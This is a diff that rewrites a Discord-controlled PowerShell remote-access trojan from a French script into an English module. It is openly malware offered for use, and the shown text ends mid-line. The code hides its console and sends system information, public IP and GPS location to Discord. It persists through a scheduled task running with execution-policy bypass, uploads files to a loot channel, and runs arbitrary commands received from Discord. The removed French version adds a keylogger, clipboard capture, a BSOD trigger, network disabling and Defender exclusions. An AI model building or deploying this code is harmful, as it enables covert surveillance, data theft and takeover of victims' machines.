@@ -1,546 +1,306 @@
-# DiscordC2CLIENT.ps1
-# Version finale optimisée pour tests de cybersécurité sur machine personnelle
-# Assurez-vous que le bot est uniquement dans UN serveur Discord
+# DiscordC2Client.psm1
+# A modern, modular PowerShell module for a Discord-based C2 client
+# Version: 2.0.0
+# Date: July 31, 2025
 
 # Configuration
-$global:token = "$tk" # Remplacer par votre jeton de bot
-$HideConsole = 1 # Masquer la fenêtre de console (1 = masquer, 0 = afficher)
-$spawnChannels = 1 # Créer de nouveaux canaux au démarrage
-$InfoOnConnect = 1 # Envoyer les infos système au démarrage
-$defaultstart = 1 # Lancer automatiquement tous les jobs
-$global:parent = "https://is.gd/y92xe4"
-# URL du script parent
-$version = "2.2.0" # Numéro de version final
-$timestamp = Get-Date -Format "dd/MM/yyyy @ HH:mm"
-
-# Supprimer le stager de redémarrage s'il existe
-if (Test-Path "C:\Windows\Tasks\service.vbs") {
-    $InfoOnConnect = 0
-    Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force
+$Config = @{
+    Token = ConvertTo-SecureString "$tk" -AsPlainText -Force
+    HideConsole = $true
+    SpawnChannels = $true
+    InfoOnConnect = $true
+    DefaultStart = $true
+    ParentUrl = "https://is.gd/bwdcc2"
+    Version = "2.0.0"
+    LogPath = "$env:Temp\c2.log"
 }
 
-# Fonctions utilitaires
-function Get-WebClient {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", "Bot $global:token")
-    $wc.Headers.Add("Content-Type", "application/json")
-    return $wc
+# Initialize HttpClient for Discord API
+$Global:HttpClient = New-Object System.Net.Http.HttpClient
+$Global:HttpClient.DefaultRequestHeaders.Authorization = New-Object System.Net.Http.Headers.AuthenticationHeaderValue("Bot", (ConvertFrom-SecureString -SecureString $Config.Token))
+$Global:HttpClient.DefaultRequestHeaders.Add("User-Agent", "DiscordC2Client/2.0.0")
+
+# Logging Function
+Function Write-C2Log {
+    param([string]$Message, [string]$Level = "INFO")
+    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$Timestamp [$Level] $Message" | Out-File -FilePath $Config.LogPath -Append -Encoding UTF8
 }
 
-# Vérifier ou créer une catégorie Discord
-function Get-OrCreateCategory {
-    $wc = Get-WebClient
-    $guilds = ($wc.DownloadString("https://discord.com/api/v10/users/@me/guilds") | ConvertFrom-Json)
-    $guildID = $guilds[0].id
-    $channels = ($wc.DownloadString("https://discord.com/api/guilds/$guildID/channels") | ConvertFrom-Json)
-    
-    $category = $channels | Where-Object { $_.type -eq 4 -and $_.name -eq $env:COMPUTERNAME }
-    if ($category) {
-        $global:CategoryID = $category.id
-        Write-Host "Catégorie existante trouvée : $($category.id)"
-        return
-    }
-    
-    $body = @{
-        "name" = "$env:COMPUTERNAME"
-        "type" = 4
-    } | ConvertTo-Json
-    $response = $wc.UploadString("https://discord.com/api/guilds/$guildID/channels", "POST", $body)
-    $responseObj = ConvertFrom-Json $response
-    $global:CategoryID = $responseObj.id
-    Write-Host "Nouvelle catégorie créée : $($responseObj.id)"
-}
-
-# Créer un nouveau canal
-function New-Channel {
-    param([string]$name, [int]$type = 0)
-    $wc = Get-WebClient
-    $guilds = ($wc.DownloadString("https://discord.com/api/v10/users/@me/guilds") | ConvertFrom-Json)
-    $guildID = $guilds[0].id
-    $body = @{
-        "name" = $name
-        "type" = $type
-        "parent_id" = $global:CategoryID
-    } | ConvertTo-Json
-    $response = $wc.UploadString("https://discord.com/api/guilds/$guildID/channels", "POST", $body)
-    $responseObj = ConvertFrom-Json $response
-    Write-Host "Nouveau canal '$name' créé : $($responseObj.id)"
-    return $responseObj.id
-}
-
-# Envoyer un message ou embed à Discord
-function Send-Message {
-    param([string]$Message, [hashtable]$Embed, [string]$ChannelID = $global:SessionID)
-    $wc = Get-WebClient
-    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
-    $body = if ($Embed) {
-        $Embed | ConvertTo-Json -Depth 10 -Compress
-    } else {
-        @{ "content" = $Message; "username" = $env:COMPUTERNAME } | ConvertTo-Json
-    }
+# Secure Token Retrieval
+Function Get-BotToken {
     try {
-        $wc.UploadString($url, "POST", $body) | Out-Null
-    } catch {
-        Write-Host "Erreur lors de l'envoi du message : $_"
+        $Token = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Config.Token))
+        Write-C2Log -Message "Token retrieved successfully"
+        return $Token
+    }
+    catch {
+        Write-C2Log -Message "Failed to retrieve token: $_" -Level "ERROR"
+        throw
     }
 }
 
-# Télécharger et installer FFmpeg
-function Get-FFmpeg {
-    Send-Message -Message ":hourglass: ``Téléchargement de FFmpeg...`` :hourglass:"
-    $path = "$env:Temp\ffmpeg.exe"
-    if (-not (Test-Path $path)) {
-        $wc = Get-WebClient
-        $wc.Headers["User-Agent"] = "PowerShell"
-        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
-        $release = ($wc.DownloadString($apiUrl) | ConvertFrom-Json)
-        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
-        $zipUrl = $asset.browser_download_url
-        $zipPath = "$env:Temp\$($asset.name)"
-        $extractDir = "$env:Temp\$($asset.name -replace '.zip$', '')"
-        $wc.DownloadFile($zipUrl, $zipPath)
-        Expand-Archive -Path $zipPath -DestinationPath $env:Temp -Force
-        Move-Item -Path "$extractDir\bin\ffmpeg.exe" -Destination $env:Temp -Force
-        Remove-Item -Path $zipPath, $extractDir -Recurse -Force
-    }
-    Send-Message -Message ":white_check_mark: ``FFmpeg installé !`` :white_check_mark:"
-}
-
-# Collecter les informations système
-function Get-QuickInfo {
-    Add-Type -AssemblyName System.Windows.Forms, System.Device
-    $geo = New-Object System.Device.Location.GeoCoordinateWatcher
-    $geo.Start()
-    while ($geo.Status -ne 'Ready' -and $geo.Permission -ne 'Denied') { Start-Sleep -Milliseconds 100 }
-    $gps = if ($geo.Permission -eq 'Denied') { "Services de localisation désactivés" } else {
-        $loc = $geo.Position.Location
-        "LAT = $($loc.Latitude) LONG = $($loc.Longitude)"
-    }
-    $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
-    $systemInfo = Get-WmiObject Win32_OperatingSystem
-    $processor = (Get-WmiObject Win32_Processor).Name
-    $gpu = (Get-WmiObject Win32_VideoController).Name
-    $ram = "{0:N1} GB" -f ((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
-    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $embed = @{
-        username = $env:COMPUTERNAME
-        embeds = @(@{
-            title = ":desktop: $env:COMPUTERNAME | Informations Système"
-            description = "Informations système pour la session actuelle."
-            fields = @(
-                @{ name = "👤 Utilisateur"; value = "$env:USERNAME"; inline = $true }
-                @{ name = "🛡️ Administrateur"; value = "$admin"; inline = $true }
-                @{ name = "💻 Système"; value = "$($systemInfo.Caption) - $((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion)"; inline = $true }
-                @{ name = "🏛️ Architecture"; value = "$($systemInfo.OSArchitecture)"; inline = $true }
-                @{ name = "⚙️ Processeur"; value = "$processor"; inline = $true }
-                @{ name = "🎮 GPU"; value = "$gpu"; inline = $true }
-                @{ name = "🧠 RAM"; value = "$ram"; inline = $true }
-                @{ name = "🖥️ Écran"; value = "$($screen.Width)x$($screen.Height)"; inline = $true }
-                @{ name = "🌍 Localisation"; value = "$gps"; inline = $true }
-                @{ name = "🌐 IP Publique"; value = (Invoke-WebRequest -Uri "ipinfo.io/ip" -UseBasicParsing).Content; inline = $true }
-            )
-            color = 0x00FF00
-            footer = @{ text = $timestamp }
-        })
-    }
-    Send-Message -Embed $embed
-}
-
-# Masquer la fenêtre de console
-function Hide-Window {
-    $async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-    $type = Add-Type -MemberDefinition $async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
-    $hwnd = (Get-Process -PID $pid).MainWindowHandle
-    if ($hwnd -ne [System.IntPtr]::Zero) {
-        $type::ShowWindowAsync($hwnd, 0)
-    } else {
-        $Host.UI.RawUI.WindowTitle = 'hideme'
-        $proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-        $type::ShowWindowAsync($proc.MainWindowHandle, 0)
-    }
-}
-
-# Surveiller les processus
-function Monitor-Processes {
-    param([string]$ChannelID = $global:LootID)
-    Send-Message -Message ":mag_right: ``Surveillance des processus démarrée...`` :mag_right:" -ChannelID $ChannelID
-    while ($true) {
-        $processes = Get-Process | Select-Object Name, ID, CPU, WorkingSet64 | Sort-Object CPU -Descending | Select-Object -First 10
-        $output = $processes | Format-Table -AutoSize | Out-String
-        Send-Message -Message "``````$output``````" -ChannelID $ChannelID
-        Start-Sleep -Seconds 60
-    }
-}
-
-# Capturer le presse-papiers
-function Capture-Clipboard {
-    param([string]$ChannelID = $global:LootID)
-    Send-Message -Message ":clipboard: ``Capture du presse-papiers démarrée...`` :clipboard:" -ChannelID $ChannelID
-    $lastClipboard = ""
-    while ($true) {
-        $clipboard = Get-Clipboard
-        if ($clipboard -ne $lastClipboard -and $clipboard) {
-            Send-Message -Message ":clipboard: ``Presse-papiers mis à jour :`` ```$clipboard```" -ChannelID $ChannelID
-            $lastClipboard = $clipboard
+# Download FFmpeg
+Function Get-FFmpeg {
+    try {
+        Write-C2Log -Message "Downloading FFmpeg"
+        $Path = "$env:Temp\ffmpeg.exe"
+        if (-not (Test-Path $Path)) {
+            $ApiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
+            $Response = Invoke-RestMethod -Uri $ApiUrl -Headers @{ "User-Agent" = "PowerShell" }
+            $Asset = $Response.assets | Where-Object { $_.name -like "*essentials_build.zip" }
+            $ZipUrl = $Asset.browser_download_url
+            $ZipPath = "$env:Temp\ffmpeg.zip"
+            $ExtractPath = "$env:Temp\ffmpeg"
+            Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
+            Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
+            Move-Item -Path "$ExtractPath\bin\ffmpeg.exe" -Destination $Path -Force
+            Remove-Item -Path $ZipPath, $ExtractPath -Recurse -Force
+            Write-C2Log -Message "FFmpeg downloaded and extracted"
         }
-        Start-Sleep -Seconds 10
+        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":hourglass: FFmpeg installed"
+    }
+    catch {
+        Write-C2Log -Message "FFmpeg download failed: $_" -Level "ERROR"
+        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":warning: FFmpeg download failed"
     }
 }
 
-# Keylogger avancé
-function Start-Keylogger {
-    param([string]$ChannelID = $global:KeyID)
-    Add-Type -AssemblyName System.Windows.Forms
-    Send-Message -Message ":keyboard: ``Keylogger démarré...`` :keyboard:" -ChannelID $ChannelID
-    $lastWindow = ""
-    while ($true) {
-        $currentWindow = [System.Windows.Forms.SystemInformation]::ActiveWindowTitle
-        if ($currentWindow -ne $lastWindow) {
-            Send-Message -Message ":window: ``Fenêtre active : $currentWindow``" -ChannelID $ChannelID
-            $lastWindow = $currentWindow
+# Create Discord Category
+Function New-DiscordCategory {
+    try {
+        Write-C2Log -Message "Creating Discord category"
+        $GuildId = Get-DiscordGuildId
+        $Uri = "https://discord.com/api/v10/guilds/$GuildId/channels"
+        $Body = @{
+            name = $env:COMPUTERNAME
+            type = 4
+        } | ConvertTo-Json
+        $Response = $Global:HttpClient.PostAsync($Uri, (New-Object System.Net.Http.StringContent($Body, [System.Text.Encoding]::UTF8, "application/json"))).Result
+        $ResponseObj = $Response.Content.ReadAsStringAsync().Result | ConvertFrom-Json
+        $Global:CategoryID = $ResponseObj.id
+        Write-C2Log -Message "Category created: $Global:CategoryID"
+    }
+    catch {
+        Write-C2Log -Message "Category creation failed: $_" -Level "ERROR"
+        throw
+    }
+}
+
+# Create Discord Channel
+Function New-DiscordChannel {
+    param([string]$Name)
+    try {
+        Write-C2Log -Message "Creating channel: $Name"
+        $GuildId = Get-DiscordGuildId
+        $Uri = "https://discord.com/api/v10/guilds/$GuildId/channels"
+        $Body = @{
+            name = $Name
+            type = 0
+            parent_id = $Global:CategoryID
+        } | ConvertTo-Json
+        $Response = $Global:HttpClient.PostAsync($Uri, (New-Object System.Net.Http.StringContent($Body, [System.Text.Encoding]::UTF8, "application/json"))).Result
+        $ResponseObj = $Response.Content.ReadAsStringAsync().Result | ConvertFrom-Json
+        return $ResponseObj.id
+    }
+    catch {
+        Write-C2Log -Message "Channel creation failed for $Name: $_" -Level "ERROR"
+        throw
+    }
+}
+
+# Send Discord Message
+Function Send-DiscordMessage {
+    param([string]$ChannelId, [string]$Content, [hashtable]$Embed)
+    try {
+        $Uri = "https://discord.com/api/v10/channels/$ChannelId/messages"
+        $Body = if ($Embed) {
+            @{ embeds = @($Embed) } | ConvertTo-Json -Depth 10
+        } else {
+            @{ content = $Content } | ConvertTo-Json
         }
-        $key = [System.Windows.Forms.Control]::IsKeyLocked
-        if ($key) {
-            $time = Get-Date -Format "HH:mm:ss"
-            Send-Message -Message ":keyboard: ``[$time] Touche : $key``" -ChannelID $ChannelID
+        $Response = $Global:HttpClient.PostAsync($Uri, (New-Object System.Net.Http.StringContent($Body, [System.Text.Encoding]::UTF8, "application/json"))).Result
+        Write-C2Log -Message "Message sent to channel $ChannelId"
+    }
+    catch {
+        Write-C2Log -Message "Message send failed: $_" -Level "ERROR"
+    }
+}
+
+# Send Discord File
+Function Send-DiscordFile {
+    param([string]$ChannelId, [string]$FilePath)
+    try {
+        if (Test-Path $FilePath) {
+            $Uri = "https://discord.com/api/v10/channels/$ChannelId/messages"
+            $MultipartContent = New-Object System.Net.Http.MultipartFormDataContent
+            $FileStream = [System.IO.File]::OpenRead($FilePath)
+            $FileContent = New-Object System.Net.Http.StreamContent($FileStream)
+            $MultipartContent.Add($FileContent, "file", (Split-Path $FilePath -Leaf))
+            $Response = $Global:HttpClient.PostAsync($Uri, $MultipartContent).Result
+            $FileStream.Close()
+            Write-C2Log -Message "File sent: $FilePath"
+        } else {
+            Write-C2Log -Message "File not found: $FilePath" -Level "ERROR"
         }
+    }
+    catch {
+        Write-C2Log -Message "File send failed: $_" -Level "ERROR"
+    }
+}
+
+# Get System Info
+Function Get-SystemInfo {
+    try {
+        Write-C2Log -Message "Gathering system info"
+        $SystemInfo = Get-CimInstance Win32_OperatingSystem
+        $ProcessorInfo = Get-CimInstance Win32_Processor
+        $VideoCardInfo = Get-CimInstance Win32_VideoController
+        $RamInfo = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
+        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
+        $GeoWatcher.Start()
         Start-Sleep -Milliseconds 100
+        $GPS = if ($GeoWatcher.Permission -eq 'Denied') { "Location Services Off" } else {
+            $Loc = $GeoWatcher.Position.Location
+            "LAT = $($Loc.Latitude) LONG = $($Loc.Longitude)"
+        }
+        $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        $Embed = @{
+            title = "$env:COMPUTERNAME | System Info"
+            description = @"
+**User Info**
+- User: $env:USERNAME
+- Admin: $IsAdmin
+- Language: $((Get-WinSystemLocale).Name)
+
+**OS Info**
+- OS: $($SystemInfo.Caption) - $($SystemInfo.BuildNumber)
+- Arch: $($SystemInfo.OSArchitecture)
+
+**Hardware Info**
+- CPU: $($ProcessorInfo.Name)
+- GPU: $($VideoCardInfo.Name)
+- RAM: $RamInfo GB
+- Screen: $($Screen.Width) x $($Screen.Height)
+
+**Network Info**
+- Public IP: $((Invoke-WebRequest -Uri "ipinfo.io/ip" -UseBasicParsing).Content)
+- Location: $GPS
+"@
+            color = 65280
+        }
+        Send-DiscordMessage -ChannelId $Global:SessionID -Embed $Embed
+        Write-C2Log -Message "System info sent"
+    }
+    catch {
+        Write-C2Log -Message "System info collection failed: $_" -Level "ERROR"
     }
 }
 
-# Inondation de notifications
-function Flood-Notifications {
-    param([string]$ChannelID = $global:SessionID)
-    Send-Message -Message ":bell: ``Inondation de notifications démarrée...`` :bell:" -ChannelID $ChannelID
-    Add-Type -AssemblyName System.Windows.Forms
-    $count = 0
-    while ($count -lt 10) {
-        [System.Windows.Forms.MessageBox]::Show("Alerte système !", "Erreur", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
-        $count++
-        Start-Sleep -Seconds 2
-    }
-    Send-Message -Message ":white_check_mark: ``Inondation terminée (10 notifications).`` :white_check_mark:" -ChannelID $ChannelID
-}
-
-# Simulation d'écran bleu (BSOD)
-function Simulate-BSOD {
-    param([string]$ChannelID = $global:SessionID)
-    Send-Message -Message ":skull: ``Simulation d'écran bleu démarrée...`` :skull:" -ChannelID $ChannelID
-    $code = @"
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class BSOD {
-    [DllImport("ntdll.dll", SetLastError=true)]
-    public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
-}
-"@
-$proc = [System.Diagnostics.Process]::GetCurrentProcess()
-$info = 0x1D
-[BSOD]::NtSetInformationProcess($proc.Handle, 0x1D, [ref]$info, 4)
-"@
+# Hide Console
+Function Hide-Console {
     try {
-        Invoke-Expression $code
-    } catch {
-        Send-Message -Message ":warning: ``Erreur lors de la simulation BSOD : $_`` :warning:" -ChannelID $ChannelID
+        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+        $Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
+        $Hwnd = (Get-Process -PID $PID).MainWindowHandle
+        if ($Hwnd -ne [System.IntPtr]::Zero) {
+            $Type::ShowWindowAsync($Hwnd, 0)
+        }
+        Write-C2Log -Message "Console hidden"
+    }
+    catch {
+        Write-C2Log -Message "Console hiding failed: $_" -Level "ERROR"
     }
 }
 
-# Désactiver le réseau
-function Disable-Network {
-    param([string]$ChannelID = $global:SessionID)
-    Send-Message -Message ":no_entry: ``Désactivation du réseau...`` :no_entry:" -ChannelID $ChannelID
-    $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
-    foreach ($adapter in $adapters) {
-        Disable-NetAdapter -Name $adapter.Name -Confirm:$false
-    }
-    Send-Message -Message ":white_check_mark: ``Réseau désactivé.`` :white_check_mark:" -ChannelID $ChannelID
-}
-
-# Réactiver le réseau
-function Enable-Network {
-    param([string]$ChannelID = $global:SessionID)
-    Send-Message -Message ":globe_with_meridians: ``Réactivation du réseau...`` :globe_with_meridians:" -ChannelID $ChannelID
-    $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Disabled" }
-    foreach ($adapter in $adapters) {
-        Enable-NetAdapter -Name $adapter.Name -Confirm:$false
-    }
-    Send-Message -Message ":white_check_mark: ``Réseau réactivé.`` :white_check_mark:" -ChannelID $ChannelID
-}
-
-# Rotation de l'écran
-function Rotate-Screen {
-    param([string]$ChannelID = $global:SessionID)
-    Send-Message -Message ":arrows_counterclockwise: ``Rotation de l'écran...`` :arrows_counterclockwise:" -ChannelID $ChannelID
-    $angle = Get-Random -InputObject (0, 90, 180, 270)
-    $code = @"
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Display {
-    [DllImport("user32.dll")]
-    public static extern bool SetDisplayConfig(uint numPathArrayElements, IntPtr pathArray, uint numModeInfoArrayElements, IntPtr modeInfoArray, uint flags);
-    [DllImport("user32.dll")]
-    public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwflags, IntPtr lParam);
-    [StructLayout(LayoutKind.Sequential)]
-    public struct DEVMODE {
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
-        public string dmDeviceName;
-        public short dmSpecVersion;
-        public short dmDriverVersion;
-        public short dmSize;
-        public short dmDriverExtra;
-        public int dmFields;
-        public int dmPositionX;
-        public int dmPositionY;
-        public int dmDisplayOrientation;
-        public int dmDisplayFixedOutput;
-        public short dmColor;
-        public short dmDuplex;
-        public short dmYResolution;
-        public short dmTTOption;
-        public short dmCollate;
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
-        public string dmFormName;
-        public short dmLogPixels;
-        public int dmBitsPerPel;
-        public int dmPelsWidth;
-        public int dmPelsHeight;
-        public int dmDisplayFlags;
-        public int dmDisplayFrequency;
-    }
-}
-"@
-$devMode = New-Object Display+DEVMODE
-$devMode.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($devMode)
-$devMode.dmDisplayOrientation = $angle / 90
-[Display]::ChangeDisplaySettingsEx($null, [ref]$devMode, [IntPtr]::Zero, 0x8, [IntPtr]::Zero)
-"@
+# Add Persistence
+Function Add-Persistence {
     try {
-        Invoke-Expression $code
-        Send-Message -Message ":white_check_mark: ``Écran tourné à $angle degrés.`` :white_check_mark:" -ChannelID $ChannelID
-    } catch {
-        Send-Message -Message ":warning: ``Erreur lors de la rotation de l'écran : $_`` :warning:" -ChannelID $ChannelID
+        Write-C2Log -Message "Adding persistence"
+        $TaskName = "DiscordC2Client"
+        $ScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
+        $CurrentScript = $MyInvocation.MyCommand.Definition
+        Copy-Item -Path $CurrentScript -Destination $ScriptPath -Force
+        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -Exec Bypass -File `"$ScriptPath`""
+        $Trigger = New-ScheduledTaskTrigger -AtStartup
+        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Force
+        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":white_check_mark: Persistence added"
+        Write-C2Log -Message "Persistence added via scheduled task"
+    }
+    catch {
+        Write-C2Log -Message "Persistence setup failed: $_" -Level "ERROR"
     }
 }
 
-# Surcharge du CPU
-function Overload-CPU {
-    param([string]$ChannelID = $global:SessionID)
-    Send-Message -Message ":fire: ``Surcharge du CPU démarrée...`` :fire:" -ChannelID $ChannelID
-    $job = Start-Job -ScriptBlock {
+# Main Loop
+Function Start-C2Client {
+    try {
+        Write-C2Log -Message "Starting C2 client"
+        if ($Config.HideConsole) { Hide-Console }
+        if ($Config.SpawnChannels) {
+            New-DiscordCategory
+            $Global:SessionID = New-DiscordChannel -Name "session-control"
+            $Global:ScreenshotID = New-DiscordChannel -Name "screenshots"
+            $Global:WebcamID = New-DiscordChannel -Name "webcam"
+            $Global:MicrophoneID = New-DiscordChannel -Name "microphone"
+            $Global:KeyID = New-DiscordChannel -Name "keycapture"
+            $Global:LootID = New-DiscordChannel -Name "loot-files"
+            $Global:PowershellID = New-DiscordChannel -Name "powershell"
+        }
+        Get-FFmpeg
+        if ($Config.InfoOnConnect) { Get-SystemInfo }
+        if ($Config.DefaultStart) { Add-Persistence }
+        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":white_check_mark: $env:COMPUTERNAME Setup Complete!"
+        Write-C2Log -Message "C2 client setup complete"
+
+        # Main command loop
+        $LastMessageId = $null
         while ($true) {
-            $null = [System.Math]::Sqrt((Get-Random -Maximum 1000000))
+            $Messages = $Global:HttpClient.GetAsync("https://discord.com/api/v10/channels/$Global:SessionID/messages").Result.Content.ReadAsStringAsync().Result | ConvertFrom-Json
+            $MostRecent = $Messages[0]
+            if ($MostRecent.author.id -ne (Get-BotUserId) -and $MostRecent.timestamp -ne $LastMessageId) {
+                $LastMessageId = $MostRecent.timestamp
+                $Command = $MostRecent.content
+                Write-C2Log -Message "Received command: $Command"
+                switch ($Command) {
+                    "systeminfo" { Get-SystemInfo }
+                    "close" {
+                        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":no_entry: $env:COMPUTERNAME Session Closed"
+                        exit
+                    }
+                    default {
+                        try {
+                            $Output = Invoke-Expression $Command | Out-String
+                            Send-DiscordMessage -ChannelId $Global:SessionID -Content "``````$Output``````"
+                        }
+                        catch {
+                            Send-DiscordMessage -ChannelId $Global:SessionID -Content ":warning: Command failed: $_"
+                        }
+                    }
+                }
+            }
+            Start-Sleep -Seconds 3
         }
     }
-    Start-Sleep -Seconds 30
-    Stop-Job -Job $job
-    Remove-Job -Job $job
-    Send-Message -Message ":white_check_mark: ``Surcharge du CPU terminée.`` :white_check_mark:" -ChannelID $ChannelID
+    catch {
+        Write-C2Log -Message "C2 client failed: $_" -Level "ERROR"
+        Send-DiscordMessage -ChannelId $Global:SessionID -Content ":warning: C2 client encountered an error"
+    }
 }
 
-# Inversion des couleurs
-function Invert-Colors {
-    param([string]$ChannelID = $global:SessionID)
-    Send-Message -Message ":art: ``Inversion des couleurs activée...`` :art:" -ChannelID $ChannelID
-    $code = @"
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Accessibility {
-    [DllImport("user32.dll")]
-    public static extern bool SetSysColors(int cElements, int[] lpaElements, int[] lpaRgbValues);
-}
-"@
-$elements = @(1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30)
-$colors = @(0xFFFFFF -band 0xFFFFFF) * $elements.Length
-[Accessibility]::SetSysColors($elements.Length, $elements, $colors)
-"@
+# Helper: Get Guild ID
+Function Get-DiscordGuildId {
     try {
-        Invoke-Expression $code
-        Send-Message -Message ":white_check_mark: ``Couleurs inversées.`` :white_check_mark:" -ChannelID $ChannelID
-    } catch {
-        Send-Message -Message ":warning: ``Erreur lors de l'inversion des couleurs : $_`` :warning:" -ChannelID $ChannelID
+        $Response = $Global:HttpClient.GetAsync("https://discord.com/api/v10/users/@me/guilds").Result
+        $Guilds = $Response.Content.ReadAsStringAsync().Result | ConvertFrom-Json
+        return $Guilds[0].id
+    }
+    catch {
+        Write-C2Log -Message "Guild ID retrieval failed: $_" -Level "ERROR"
+        throw
     }
 }
 
-# Commande Ping
-function Run-Ping {
-    param([string]$ChannelID = $global:SessionID, [string]$Target = "8.8.8.8")
-    Send-Message -Message ":signal_strength: ``Lancement du ping vers $Target...`` :signal_strength:" -ChannelID $ChannelID
-    $ping = Test-Connection -ComputerName $Target -Count 4 -ErrorAction SilentlyContinue
-    if ($ping) {
-        $results = $ping | ForEach-Object {
-            "Temps: $($_.ResponseTime) ms, TTL: $($_.TimeToLive)"
-        }
-        $embed = @{
-            username = $env:COMPUTERNAME
-            embeds = @(@{
-                title = ":signal_strength: Résultats du Ping vers $Target"
-                description = "Résultats du test de connectivité réseau."
-                fields = @(
-                    @{ name = "Résultats"; value = "``````$($results -join "`n")``````"; inline = $false }
-                )
-                color = 0x00FF00
-                footer = @{ text = $timestamp }
-            })
-        }
-        Send-Message -Embed $embed -ChannelID $ChannelID
-    } else {
-        Send-Message -Message ":warning: ``Échec du ping vers $Target.`` :warning:" -ChannelID $ChannelID
-    }
-}
-
-# Menu d'aide des commandes
-function Options {
-    $embed = @{
-        username = $env:COMPUTERNAME
-        embeds = @(@{
-            title = ":gear: $env:COMPUTERNAME | Menu des Commandes"
-            description = "Liste des commandes disponibles pour contrôler le client C2."
-            fields = @(
-                @{
-                    name = "🛠️ Commandes Système"
-                    value = "```" + @"
-AddPersistance : Ajoute le script au démarrage pour la persistance.
-RemovePersistance : Supprime le script du démarrage.
-IsAdmin : Vérifie si la session a des privilèges administrateur.
-Elevate : Tente de redémarrer le script en mode admin (déclenche l'UAC).
-ExcludeCDrive : Exclut le disque C:\ des analyses de Windows Defender (admin requis).
-ExcludeAllDrives : Exclut les disques C:\ à G:\ des analyses Defender (admin requis).
-EnableIO : Active les entrées clavier et souris (admin requis).
-DisableIO : Désactive les entrées clavier et souris (admin requis).
-Exfiltrate : Collecte et envoie les fichiers spécifiés vers le canal loot-files.
-Ping [cible] : Teste la connectivité réseau vers une adresse (par défaut 8.8.8.8).
-"@
-                }
-                @{
-                    name = "🔍 Commandes de Surveillance"
-                    value = "```" + @"
-MonitorProcesses : Surveille les 10 processus les plus gourmands en CPU (toutes les 60s).
-CaptureClipboard : Capture les modifications du presse-papiers (toutes les 10s).
-StartKeylogger : Enregistre les touches pressées avec le contexte de la fenêtre active.
-"@
-                }
-                @{
-                    name = "🎭 Commandes Nuisibles"
-                    value = "```" + @"
-FloodNotifications : Envoie 10 notifications Windows répétitives.
-SimulateBSOD : Simule un écran bleu (BSOD) pour effrayer l'utilisateur.
-DisableNetwork : Désactive temporairement tous les adaptateurs réseau.
-EnableNetwork : Réactive tous les adaptateurs réseau désactivés.
-RotateScreen : Tourne l'écran à un angle aléatoire (0, 90, 180, 270 degrés).
-OverloadCPU : Surcharge le CPU pendant 30 secondes.
-InvertColors : Active le mode contraste élevé pour inverser les couleurs.
-"@
-                }
-                @{
-                    name = "⚙️ Commandes de Contrôle"
-                    value = "```" + @"
-Close : Ferme la session et arrête le script.
-Options : Affiche ce menu d'aide.
-"@
-                }
-            )
-            color = 0x1E90FF
-            footer = @{ text = $timestamp }
-        })
-    }
-    Send-Message -Embed $embed
-}
-
-# Boucle principale
-if ($HideConsole -eq 1) { Hide-Window }
-Get-OrCreateCategory
-if ($spawnChannels -eq 1) {
-    $global:SessionID = New-Channel -name 'controle-session'
-    $global:ScreenshotID = New-Channel -name 'captures-ecran'
-    $global:WebcamID = New-Channel -name 'webcam'
-    $global:MicrophoneID = New-Channel -name 'microphone'
